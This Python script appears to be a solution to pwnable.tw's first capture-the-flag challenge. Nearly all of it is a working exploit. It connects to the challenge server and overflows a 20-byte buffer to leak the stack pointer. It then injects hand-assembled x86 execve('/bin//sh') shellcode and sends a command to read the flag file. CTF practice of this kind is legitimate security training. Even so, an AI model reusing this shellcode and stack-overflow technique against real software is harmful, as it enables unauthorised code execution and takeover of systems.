"""
pwnable.tw challenge 1
"""
import socket
import binascii
import struct

# The original code only uses the first 20 characters of input
__PAD__ = 20


def shellcode():
    """Function to return bytecode for launching a shell"""
    code = binascii.unhexlify('31C0')        # xor eax,eax
    code += binascii.unhexlify('50')         # push eax
    code += binascii.unhexlify('682F2F7368') # push dword 0x68732f2f
    code += binascii.unhexlify('682F62696E') # push dword 0x6e69622f
    code += binascii.unhexlify('89E3')       # mov ebx,esp
    code += binascii.unhexlify('50')         # push eax
    code += binascii.unhexlify('53')         # push ebx
    code += binascii.unhexlify('89E1')       # mov ecx,esp
    code += binascii.unhexlify('B00B')       # mov al,0xb
    code += binascii.unhexlify('31D2')       # xor edx,edx
    code += binascii.unhexlify('CD80')       # int 0x80
    return code


def main():
    """Main function for launching the attack"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.connect(('chall.pwnable.tw', 10000))
    _ = sock.recv(4096)

    # print('Fetching ESP')
    buff = b'\0' * __PAD__
    buff += struct.pack('<I', 0x08048087)
    sock.send(buff)

    esp, = struct.unpack('<I', sock.recv(4096)[:4])

    # print('Leaked ESP: {}'.format(hex(esp)))

    # print('Launching shell')
    buff = b'\0' * __PAD__
    buff += struct.pack('<I', esp+__PAD__)
    buff += shellcode()
    sock.send(buff)

    # print('Fetching CTF flag')
    sock.send(b'cat /home/start/flag\n')
    print(sock.recv(4096).decode())

    sock.close()

if __name__ == '__main__':
    main()
